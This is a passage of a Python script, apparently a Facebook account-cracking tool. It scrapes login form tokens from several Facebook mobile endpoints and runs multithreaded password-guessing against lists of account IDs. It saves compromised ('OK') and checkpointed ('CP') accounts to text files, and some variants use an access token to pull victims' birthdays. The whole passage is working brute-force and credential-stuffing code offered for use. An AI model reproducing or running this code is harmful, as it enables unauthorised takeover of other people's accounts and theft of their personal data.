			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb

def m_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return

def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb


### BRUTE CRACK ###
#Generate1
class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate1(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n               "%(fl.get("id"),i,)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i,cek_apk)))
					self.ada.append("%s • %s"%(fl.get("id"),i,cek_apk))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i,cek_apk))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
#Generate2
class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate2(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i,cek_apk)))
					self.ada.append("%s • %s"%(fl.get("id"),i,cek_apk))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i,cek_apk))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
#Generate3
class crekm:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate3(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i,cek_apk)))
					self.ada.append("%s • %s"%(fl.get("id"),i,cek_apk))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i,cek_apk))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
#Generate1
class crekmttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate1(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i,cek_apk)))
					self.ada.append("%s • %s"%(fl.get("id"),i,cek_apk))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i,cek_apk))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
#Generate2
class tofbe:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate2(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i,cek_apk)))
					self.ada.append("%s • %s"%(fl.get("id"),i,cek_apk))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i,cek_apk))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
#Generate3
class tofbettl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate3(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i,cek_apk)))
					self.ada.append("%s • %s"%(fl.get("id"),i,cek_apk))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i,cek_apk))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
#Generate1
class freefb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate1(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,freefacebook)
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n * --> %s • %s\n               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print("\r\x1b[0;32m * --> %s • %s              "%(fl.get("id"),i,cek_apk))
					self.ada.append("%s • %s"%(fl.get("id"),i,cek_apk))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i,cek_apk))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
#Gen2
class freefbttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate2(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,freefacebook)
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i,cek_apk)))
					self.ada.append("%s • %s"%(fl.get("id"),i,cek_apk))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i,cek,apk))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
#Gen3
class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
      if f in[""," "]:
        print((p+" ["+k+"•"+m+"•"+p+"] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
